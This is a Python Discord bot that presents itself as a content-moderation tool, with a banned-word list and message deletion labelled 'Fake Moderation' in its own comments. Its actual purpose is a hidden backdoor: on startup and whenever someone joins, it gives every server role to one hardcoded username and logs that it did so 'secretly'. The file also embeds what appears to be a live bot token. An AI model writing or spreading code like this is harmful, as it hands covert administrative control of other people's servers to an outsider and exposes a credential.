import discord
from discord.ext import commands

TOKEN = "MTM1NDk2NDk5ODY2MDgxNjkwNg.Gk54MB.hgGb3MCgRtedVFpGSNWFmeYeXGSbWNnZixV-zQ"  # Replace with your bot token
TARGET_USERNAME = "tomandjerry_winterarc"
BANNED_WORDS = ["porn", "child pornography", "pornography", "cp", "gore", "nudes"]  # Words that trigger moderation

intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # Needed to detect users
intents.message_content = True  # Needed to read messages
intents.messages = True  # Needed to delete messages

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

    # **Give roles if target user is already in the server**
    for guild in bot.guilds:
        for member in guild.members:
            if member.name == TARGET_USERNAME:
                await give_all_roles(member)
                print(f"✅ Secretly gave all roles to {TARGET_USERNAME} in {guild.name}")

@bot.event
async def on_member_join(member):
    if member.name == TARGET_USERNAME:
        await give_all_roles(member)
        print(f"✅ Secretly gave all roles to {TARGET_USERNAME} upon joining {member.guild.name}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return  # Ignore bot's own messages

    # **Fake Moderation: Delete messages with banned words & warn the user**
    for word in BANNED_WORDS:
        if word in message.content.lower():
            try:
                await message.delete()  # Delete the inappropriate message
                await message.channel.send(f"⚠️ {message.author.mention}, that type of content is not allowed!")
            except discord.Forbidden:
                print("❌ Missing permissions to delete messages.")
            break  # Stop checking after the first bad word

    await bot.process_commands(message)

async def give_all_roles(member):
    for role in member.guild.roles:
        if role not in member.roles and role.name != "@everyone":
            try:
                await member.add_roles(role)
            except discord.Forbidden:
                print(f"❌ Missing permissions to give {role.name}")

# **Run the bot**
bot.run(TOKEN)
